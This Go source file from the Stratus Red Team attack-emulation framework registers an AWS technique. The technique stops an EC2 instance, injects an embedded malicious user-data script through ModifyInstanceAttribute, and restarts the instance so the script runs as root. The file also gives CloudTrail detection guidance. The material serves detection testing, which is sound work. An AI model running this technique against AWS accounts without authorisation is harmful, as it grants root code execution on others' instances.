package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"time"
)

//go:embed main.tf
var tf []byte

//go:embed malicious-user-data.sh
var maliciousUserData []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.execution.ec2-user-data",
		FriendlyName: "Execute Commands on EC2 Instance via User Data",
		IsSlow:       true,
		Description: `
Executes code on a Linux EC2 instance through User Data.

References:

- https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html

Warm-up:

- Create the prerequisite EC2 instance and VPC (takes a few minutes).

Detonation:

- Stop the instance
- Use ModifyInstanceAttribute to inject a malicious script in user data
- Start the instance
- Upon starting, the malicious script in user data is automatically executed as the root user
`,
		Detection: `
Identify when the following sequence of CloudTrail events occur in a short period of time (e.g., < 1 hour)

1. <code>StopInstances</code> (necessary, because the user data of an instance cannot be changed when it's running)
2. <code>ModifyInstanceAttribute</code> with <code>requestParameters.userData</code> non-empty

When not possible to perform such correlation, alerting on the second event only is an option. It's generally not 
expected that the user data of an EC2 instance changes often, especially with the popularity of immutable machine images,
provisioned before instantiation.
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	instanceId := params["instance_id"]

	err := stopInstance(instanceId, ec2Client)
	if err != nil {
		return err
	}

	log.Println("Injecting malicious user data")
	_, err = ec2Client.ModifyInstanceAttribute(context.Background(), &ec2.ModifyInstanceAttributeInput{
		InstanceId: &instanceId,
		UserData:   &types.BlobAttributeValue{Value: maliciousUserData},
	})
	if err != nil {
		return errors.New("unable to update user data: " + err.Error())
	}

	err = startInstance(instanceId, ec2Client)
	if err != nil {
		return err
	}

	log.Println("Instance " + instanceId + " started, malicious script in user data has been executed")
	return nil
}

// Maximum time to wait for the instance to start and stop
const maxWaitDuration = 2 * time.Minute

// Stops an EC2 instance, and synchronously returns only when it is stopped
func stopInstance(instanceId string, ec2Client *ec2.Client) error {
	log.Println("Stopping instance " + instanceId)
	_, err := ec2Client.StopInstances(context.Background(), &ec2.StopInstancesInput{
		InstanceIds: []string{instanceId},
		Force:       aws.Bool(true),
	})
	if err != nil {
		return errors.New("unable to stop instance " + instanceId + ": " + err.Error())
	}

	log.Println("Waiting for instance to be stopped")
	var stopOptions = func(options *ec2.InstanceStoppedWaiterOptions) {
		options.MaxDelay = 2 * time.Second // retry every 2 seconds
		options.MinDelay = 1 * time.Second
	}
	err = ec2.NewInstanceStoppedWaiter(ec2Client, stopOptions).Wait(
		context.Background(),
		&ec2.DescribeInstancesInput{InstanceIds: []string{instanceId}},
		maxWaitDuration,
	)
	if err != nil {
		return errors.New("unable to wait for instance " + instanceId + " to be stopped: " + err.Error())
	}
	return nil
}

// Starts an EC2 instance, and synchronously returns only when it is running
func startInstance(instanceId string, ec2Client *ec2.Client) error {
	log.Println("Starting instance")
	_, err := ec2Client.StartInstances(context.Background(), &ec2.StartInstancesInput{
		InstanceIds: []string{instanceId},
	})
	if err != nil {
		return errors.New("unable to start instance: " + err.Error())
	}

	var startOptions = func(options *ec2.InstanceRunningWaiterOptions) {
		options.MaxDelay = 2 * time.Second // retry every 2 seconds
		options.MinDelay = 1 * time.Second
	}
	err = ec2.NewInstanceRunningWaiter(ec2Client, startOptions).Wait(
		context.Background(),
		&ec2.DescribeInstancesInput{InstanceIds: []string{instanceId}},
		maxWaitDuration,
	)
	if err != nil {
		return errors.New("unable to wait for instance " + instanceId + " to be started again: " + err.Error())
	}
	return nil
}
